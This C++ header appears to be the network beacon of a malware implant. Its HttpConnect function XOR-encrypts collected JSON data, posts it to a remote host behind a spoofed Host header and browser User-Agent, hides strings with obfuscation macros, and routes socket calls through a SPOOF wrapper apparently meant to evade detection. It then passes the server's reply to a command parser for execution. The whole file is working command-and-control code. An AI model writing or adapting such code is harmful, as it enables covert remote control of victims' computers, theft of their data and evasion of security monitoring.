#pragma once

addrinfo* addrInfoList = NULL;

int HttpConnect(char* host, char* port, stringObj& outputJson) {
	// 构造请求包
	char* httpHeader =
		OBFSTR("POST /12345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234 HTTP/1.1\r\n"
			"Host: www.google.com.hk\r\n"
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36\r\n"
			"Content-Type: application/octet-stream\r\n"
			"Content-Length: 0\r\n"
			"Connection: close\r\n\r\n", "httpHeaderSIG");
	char* contentLength = OBFSTR("Content-Length:", "OBFSIG");
	char* pos = StrStr(httpHeader, contentLength);
	if (pos == NULL) {
		return 0;
	}
	pos += StrLen(contentLength) + 1;
	*pos = '\0';
	pos++;
	XorData(outputJson.str, outputJson.str, outputJson.length);
	char buf[20];
	char* format = OBFSTR("%d", "OBFSIG");
	SPOOF(wsprintfA, 3, buf, format, outputJson.length + 8);
	stringObj requestPacket = stringObj(httpHeader) + buf + pos + outputJson + OBFSTR("12345678", "OBFSIG");
	if (!requestPacket.length) {
		return 0;
	}
	memcpy(requestPacket.str + requestPacket.length - 8, key + 6, 8);

	// 解析域名
	if (addrInfoList == NULL) {
		addrinfo hints = {};
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;
		if (SPOOF(getaddrinfo, 4, host, port, &hints, &addrInfoList)) {
			addrInfoList = NULL;
			return 0;
		}
	}
	// 创建套接字建立连接
	int conn = 1;
	int result = 0;
	SOCKET clientSocket;
	for (addrinfo* ptr = addrInfoList; ptr != NULL; ptr = ptr->ai_next) {
		clientSocket = SPOOF(socket, 3, ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (clientSocket == INVALID_SOCKET) {
			continue;
		}
		conn = SPOOF(connect, 3, clientSocket, ptr->ai_addr, ptr->ai_addrlen);
		if (conn) {
			SPOOF(closesocket, 1, clientSocket);
			continue;
		}
		break;
	}
	if (conn) {
		goto End2;
	}
	// POST 请求
	if (SPOOF(send, 4, clientSocket, requestPacket.str, requestPacket.length, 0) == SOCKET_ERROR) {
		goto End2;
	}
	// 接收响应包
	char* responsePacket = (char*)SafeAlloc(512);
	if (responsePacket == NULL) {
		goto End2;
	}
	size_t recvLen = 0;
	size_t currentRecvLen = 0;
	while ((currentRecvLen = SPOOF(recv, 4, clientSocket, responsePacket + recvLen, 512, 0)) > 0) {
		recvLen += currentRecvLen;
		char* reResponsePacket = (char*)SafeReAlloc(responsePacket, recvLen + 512);
		if (reResponsePacket == NULL) {
			goto End1;
		}
		responsePacket = reResponsePacket;
	}
	if (currentRecvLen == SOCKET_ERROR) {
		goto End1;
	}
	// 解析响应头
	pos = StrStr(responsePacket, OBFSTR("\r\n\r\n", "OBFSIG"));
	if (pos == NULL) {
		goto End1;
	}
	*pos = '\0';
	// 解析命令
	size_t responseBodyLen = recvLen - StrLen(responsePacket) - 4;
	if (responseBodyLen) {
		ParseCommandData(pos + 4, responseBodyLen);
	}
	result = 1;
End1:
	SafeFree(responsePacket);
End2:
	SPOOF(closesocket, 1, clientSocket);
	return result;
}